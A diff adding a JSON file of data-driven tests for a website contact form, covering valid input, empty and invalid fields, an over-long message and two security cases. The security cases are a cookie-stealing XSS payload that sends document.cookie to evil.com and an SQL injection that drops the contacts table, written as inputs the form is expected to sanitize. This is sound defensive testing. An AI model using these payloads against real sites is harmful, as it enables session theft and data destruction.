@@ -1,0 +1,67 @@
+{
+  "testSuite": "Contact Form - Data Driven Tests",
+  "version": "1.0",
+  "lastUpdated": "2026-04-22",
+  "testData": [
+    {
+      "testId": "TC_CONTACT_001",
+      "scenario": "Valid Contact Submission",
+      "category": "positive",
+      "firstName": "Quality",
+      "lastName": "Tester",
+      "email": "qa.tester@mailinator.com",
+      "message": "This is a valid test message for QA validation.",
+      "expectedResult": "Form submitted successfully"
+    },
+    {
+      "testId": "TC_CONTACT_002",
+      "scenario": "All Fields Empty",
+      "category": "negative",
+      "firstName": "",
+      "lastName": "",
+      "email": "",
+      "message": "",
+      "expectedResult": "Validation errors for required fields"
+    },
+    {
+      "testId": "TC_CONTACT_003",
+      "scenario": "Invalid Email in Contact",
+      "category": "negative",
+      "firstName": "Test",
+      "lastName": "User",
+      "email": "bademail",
+      "message": "Test message",
+      "expectedResult": "Email validation error"
+    },
+    {
+      "testId": "TC_CONTACT_004",
+      "scenario": "XSS in Message Field",
+      "category": "security",
+      "firstName": "Test",
+      "lastName": "User",
+      "email": "test@test.com",
+      "message": "<script>document.location='http://evil.com/steal?c='+document.cookie</script>",
+      "expectedResult": "Script stripped/escaped"
+    },
+    {
+      "testId": "TC_CONTACT_005",
+      "scenario": "SQL Injection in First Name",
+      "category": "security",
+      "firstName": "'; DROP TABLE contacts; --",
+      "lastName": "Test",
+      "email": "sql@test.com",
+      "message": "Test message",
+      "expectedResult": "Input sanitized"
+    },
+    {
+      "testId": "TC_CONTACT_006",
+      "scenario": "Extremely Long Message (5000+ chars)",
+      "category": "boundary",
+      "firstName": "Test",
+      "lastName": "User",
+      "email": "long@test.com",
+      "message": "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Sed ut perspiciatis unde omnis iste natus error sit voluptatem accusantium doloremque laudantium, totam rem aperiam, eaque ipsa quae ab illo inventore veritatis et quasi architecto beatae vitae dicta sunt explicabo. Nemo enim ipsam voluptatem quia voluptas sit aspernatur aut odit aut fugit, sed quia consequuntur magni dolores eos qui ratione voluptatem sequi nesciunt. Neque porro quisquam est, qui dolorem ipsum quia dolor sit amet, consectetur, adipisci velit, sed quia non numquam eius modi tempora incidunt ut labore et dolore magnam aliquam quaerat voluptatem.",
+      "expectedResult": "Handled gracefully or truncated"
+    }
+  ]
+}
